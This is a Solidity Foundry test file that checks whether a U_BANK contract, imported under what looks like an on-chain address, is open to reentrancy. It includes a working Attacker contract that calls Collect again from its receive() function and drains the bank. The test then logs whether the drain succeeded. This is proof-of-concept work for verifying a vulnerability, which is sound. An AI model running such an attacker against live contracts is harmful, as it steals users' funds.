// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol";

contract ReentrancyTest is Test {
    Log public logContract;
    U_BANK public bank;
    Attacker public attacker;
    address deployer = 0x1111111111111111111111111111111111111111;

    function setUp() public {
        // Deploy Log and U_BANK contracts
        vm.prank(deployer);
        logContract = new Log();
        vm.prank(deployer);
        bank = new U_BANK(address(logContract));
        
        vm.deal(address(this), 10 ether); // Fund test contract
        vm.deal(address(attacker), 3 ether);

        // Deploy malicious attacker contract with 3 ether funding
        attacker = new Attacker{value: 3 ether}(bank);
    }

    function testReentrancyAttack() public {
        // Deposit 2 ether from attacker to bank
        attacker.deposit();
        
        // Current timestamp is recorded in unlockTime, so advance time
        vm.warp(block.timestamp + 1);

        console2.log("--- BEFORE-Trigger ---");
        uint256 initialBankBalance = address(bank).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        console2.log("Bank balance (before): %d", initialBankBalance);
        console2.log("Attacker balance (before): %d", initialAttackerBalance);

        console2.log("--- Trigger attack() ---");
        // Begin reentrancy attack
        attacker.attack();
        
        console2.log("--- AFTER-Trigger ---");
        uint256 finalBankBalance = address(bank).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        console2.log("Bank balance (after): %d", finalBankBalance);
        console2.log("Attacker balance (after): %d", finalAttackerBalance);

        // Compute differential changes
        uint256 bankChange = initialBankBalance - finalBankBalance;
        uint256 attackerChange = finalAttackerBalance - initialAttackerBalance;
        console2.log("Bank balance change: %d", bankChange);
        console2.log("Attacker balance change: %d", attackerChange);

        // Verify final Ether balances
        bool bankDrained = (finalBankBalance == 0);
        bool attackerProfitCorrect = (attackerChange == bankChange);

        if (bankDrained && attackerProfitCorrect) {
            console2.log("Vulnerability Exists: Reentrancy attack successfully drained the bank contract");
        } else {
            console2.log("Vulnerability not Exist: Attack did not drain bank or profit mismatch");
        }
    }
}

contract Attacker {
    U_BANK public bank;
    uint256 public count;

    constructor(U_BANK _bank) payable {
        bank = _bank;
    }

    function deposit() public payable {
        // Deposit 2 ether to bank through its fallback (which calls Put)
        (bool success, ) = payable(address(bank)).call{value: 2 ether}("");
        require(success, "Deposit failed");
    }

    function attack() public {
        // Initiate first withdrawal
        bank.Collect(1 ether);
    }

    receive() external payable {
        if (count < 1) {
            count++;
            // Reenter during ETH transfer
            bank.Collect(1 ether);
        }
    }
}